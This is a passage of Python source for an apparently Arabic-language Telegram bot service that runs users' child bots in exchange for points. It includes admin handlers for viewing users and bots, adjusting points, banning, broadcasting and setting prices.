    q.edit_message_text(f"👥 <b>{page+1}/{total}</b> — {len(users)}",
        parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))


def show_user_panel(q, target):
    u = get_users().get(str(target))
    if not u:
        q.edit_message_text("❌")
        return
    banned = int(target) in get_settings().get("banned", [])
    text = (
        f"👤 <b>المستخدم</b>\n\n"
        f"<b>الاسم:</b> {u.get('first_name', '—')}\n"
        f"<b>المعرف:</b> @{u.get('username', '—')}\n"
        f"<b>الايد:</b> <code>{target}</code>\n"
        f"<b>النقاط:</b> <code>{u.get('points', 0)}</code>\n"
        f"<b>الحالة:</b> {'🚫' if banned else '✅'}"
    )
    kb = [
        [InlineKeyboardButton("💰 شحن", callback_data=f"charge_{target}"),
         InlineKeyboardButton("➖ خصم", callback_data=f"deduct_{target}")],
    ]
    if banned:
        kb.append([InlineKeyboardButton("✅ فك حظر", callback_data=f"unbanusr_{target}")])
    else:
        kb.append([InlineKeyboardButton("🚫 حظر", callback_data=f"banusr_{target}")])
    kb.append([InlineKeyboardButton("🔙 رجوع", callback_data="adm_users")])
    q.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))


def show_admin_bots(q, page):
    bots = get_bots()
    if not bots:
        q.edit_message_text("لا بوتات.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 رجوع", callback_data="adm_panel")]
            ]))
        return
    ids = list(bots.keys())
    per = 8
    total = (len(ids) + per - 1) // per
    page = max(0, min(page, total - 1))
    chunk = ids[page * per:(page + 1) * per]
    kb = []
    for bid in chunk:
        b = bots[bid]
        alive = bot_alive(bid)
        kb.append([InlineKeyboardButton(
            f"{'🟢' if alive else '🔴'} @{b.get('username', '?')}",
            callback_data=f"admbot_view_{bid}")])
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("◀️", callback_data=f"admbots_page_{page-1}"))
    if page < total - 1:
        nav.append(InlineKeyboardButton("▶️", callback_data=f"admbots_page_{page+1}"))
    if nav:
        kb.append(nav)
    kb.append([InlineKeyboardButton("🔙 رجوع", callback_data="adm_panel")])
    q.edit_message_text(f"🤖 <b>البوتات</b> — {page+1}/{total}",
        parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))


def show_admin_bot_panel(q, bid):
    b = get_bots().get(bid)
    if not b:
        q.edit_message_text("❌")
        return
    alive = bot_alive(bid)
    text = (
        f"🤖 <b>@{b.get('username')}</b>\n\n"
        f"👤 المالك: <code>{b.get('owner_id')}</code>\n"
        f"🟢 الحالة: {'يعمل' if alive else 'متوقف'}\n"
        f"📅 {b.get('created')}"
    )
    kb = [
        [InlineKeyboardButton("⏹ إيقاف" if alive else "▶️ تشغيل",
                              callback_data=f"bot_tog_{bid}")],
        [InlineKeyboardButton("🗑 حذف", callback_data=f"bot_del_{bid}")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="adm_bots")],
    ]
    q.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))

# ═══════════════════════════════════════════════════════════════
# Handle Messages
# ═══════════════════════════════════════════════════════════════
def handle_message(update: Update, context: CallbackContext):
    uid = update.effective_user.id
    if is_banned(uid):
        return
    state = user_state.get(uid)
    if not state:
        update.message.reply_text("💀 استخدم /start.")
        return
    action = state.get("action")
    text = (update.message.text or "").strip()

    # ═══ رفع توكن بوت فرعي ═══
    if action == "await_token":
        token = text
        if not re.match(r"^\d{8,12}:[A-Za-z0-9_-]{30,}$", token):
            update.message.reply_text("❌ توكن غير صالح.")
            return
        username, name = tg_get_username(token)
        if not username:
            update.message.reply_text("❌ التوكن لا يعمل.")
            return
        bots = get_bots()
        if any(b.get("token") == token for b in bots.values()):
            update.message.reply_text("❌ هذا البوت مضاف مسبقاً.")
            user_state[uid] = None
            return
        cost = get_settings().get("cost_per_bot", COST_PER_BOT)
        if not is_admin(uid):
            if get_points(uid) < cost:
                update.message.reply_text("❌ نقاطك غير كافية.")
                user_state[uid] = None
                return
            add_points(uid, -cost)
        bid = f"{uid}_{int(time.time())}"
        bots[bid] = {
            "id": bid,
            "token": token,
            "username": username,
            "name": name,
            "owner_id": uid,
            "created": time.strftime("%Y-%m-%d %H:%M:%S"),
        }
        save_bots(bots)
        if start_child(bid, token, uid, username):
            update.message.reply_text(
                f"✅ تم تشغيل بوتك: @{username}\n\n"
                f"💰 نقاطك المتبقية: {get_points(uid)}\n\n"
                f"افتح @{username} وابدأ استخدامه.",
                reply_markup=user_keyboard(uid))
            # إشعار للأدمن
            try:
                context.bot.send_message(
                    MAIN_ADMIN_ID,
                    f"🆕 <b>بوت فرعي جديد</b>\n\n"
                    f"🤖 @{username}\n"
                    f"👤 المالك: <code>{uid}</code>\n"
                    f"💰 نقاط متبقية: {get_points(uid)}",
                    parse_mode="HTML",
                )
            except Exception:
                pass
        else:
            update.message.reply_text("❌ فشل تشغيل البوت.")
        user_state[uid] = None
        return

    # ═══ شحن نقاط ═══
    if action == "await_charge":
        try:
            amount = int(text)
        except ValueError:
            update.message.reply_text("❌ رقم غير صالح.")
            return
        new_pts = add_points(int(state["target"]), amount)
        user_state[uid] = None
        update.message.reply_text(f"✅ {amount} → {new_pts}", reply_markup=admin_keyboard())
        try:
            context.bot.send_message(int(state["target"]),
                f"🎁 تم شحن حسابك بـ {amount} نقطة!\n💰 رصيدك: {new_pts}")
        except Exception:
            pass
        return

    # ═══ خصم نقاط ═══
    if action == "await_deduct":
        try:
            amount = int(text)
        except ValueError:
            update.message.reply_text("❌ رقم غير صالح.")
            return
        new_pts = add_points(int(state["target"]), -amount)
        user_state[uid] = None
        update.message.reply_text(f"✅ -{amount} → {new_pts}", reply_markup=admin_keyboard())
        return

    if action == "await_charge_by_id":
        if not text.isdigit() or add_points(int(text), 0) is None:
            update.message.reply_text("❌ المستخدم غير موجود.")
            return
        user_state[uid] = {"action": "await_charge", "target": text}
        update.message.reply_text(f"💰 أرسل عدد النقاط لـ <code>{text}</code>:",
            parse_mode="HTML")
        return

    if action == "await_deduct_by_id":
        if not text.isdigit() or add_points(int(text), 0) is None:
            update.message.reply_text("❌ المستخدم غير موجود.")
            return
        user_state[uid] = {"action": "await_deduct", "target": text}
        update.message.reply_text(f"➖ أرسل عدد النقاط لـ <code>{text}</code>:",
            parse_mode="HTML")
        return

    # ═══ إذاعة ═══
    if action == "await_broadcast":
        sent = failed = 0
        for u in get_users().values():
            try:
                context.bot.send_message(chat_id=u["id"], text=text)
                sent += 1
                time.sleep(0.05)
            except Exception:
                failed += 1
        user_state[uid] = None
        update.message.reply_text(f"✅ {sent} | ❌ {failed}", reply_markup=admin_keyboard())
        return

    # ═══ حظر / فك حظر ═══
    if action == "await_ban":
        if not text.isdigit():
            update.message.reply_text("❌")
            return
        st = get_settings()
        t = int(text)
        if t not in st["banned"]:
            st["banned"].append(t)
            save_settings(st)
        user_state[uid] = None
        update.message.reply_text(f"✅ حظر {t}", reply_markup=admin_keyboard())
        try:
            context.bot.send_message(t, "🚫 تم حظرك.")
        except Exception:
            pass
        return

    if action == "await_unban":
        if not text.isdigit():
            update.message.reply_text("❌")
            return
        st = get_settings()
        t = int(text)
        if t in st["banned"]:
            st["banned"].remove(t)
            save_settings(st)
        user_state[uid] = None
        update.message.reply_text(f"✅ فك حظر {t}", reply_markup=admin_keyboard())
        return

    # ═══ سعر الاستخدام ═══
    if action == "await_cost":
        try:
            c = int(text)
            if c < 0:
                raise ValueError
        except ValueError:
            update.message.reply_text("❌")
            return
        st = get_settings()
        st["cost_per_use"] = c
        save_settings(st)
        user_state[uid] = None
        update.message.reply_text(f"✅ سعر الاستخدام: {c}", reply_markup=admin_keyboard())
        return

    # ═══ سعر صنع بوت ═══
    if action == "await_botcost":
        try:
            c = int(text)
            if c < 0:
                raise ValueError
        except ValueError:
            update.message.reply_text("❌")
            return
        st = get_settings()
        st["cost_per_bot"] = c
        save_settings(st)
        user_state[uid] = None
        update.message.reply_text(f"✅ سعر البوت: {c}", reply_markup=admin_keyboard())
        return

    # ═══ نقاط الترحيب ═══
    if action == "await_welcome":
        try:
            p = int(text)
            if p < 0:
                raise ValueError
        except ValueError:
            update.message.reply_text("❌")
            return
        st = get_settings()
        st["welcome_points"] = p
        save_settings(st)
        user_state[uid] = None
        update.message.reply_text(f"✅ نقاط الترحيب: {p}", reply_markup=admin_keyboard())
        return

    user_state[uid] = None
    update.message.reply_text("💀 استخدم /start.")


# ═══════════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════════
def main():
    # استعادة البوتات الفرعية عند إعادة التشغيل
    try:
        for bid, b in get_bots().items():
            try:
                start_child(bid, b.get("token"), b.get("owner_id"), b.get("username"))
                time.sleep(1)
            except Exception as e:
                logger.error(f"restore child {bid}: {e}")
    except Exception as e:
        logger.error(f"main restore: {e}")

    # Flask في thread منفصل
    threading.Thread(target=run_flask, daemon=True).start()
    logger.info(f"Flask started on port {PORT}")

    # البوت الرئيسي
    updater = Updater(MAIN_BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", cmd_start))
    dp.add_handler(CallbackQueryHandler(handle_callback))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
    updater.start_polling()
    logger.info(f"🖤 {BOT_NAME} started.")
    updater.idle()


if __name__ == "__main__":
    main()
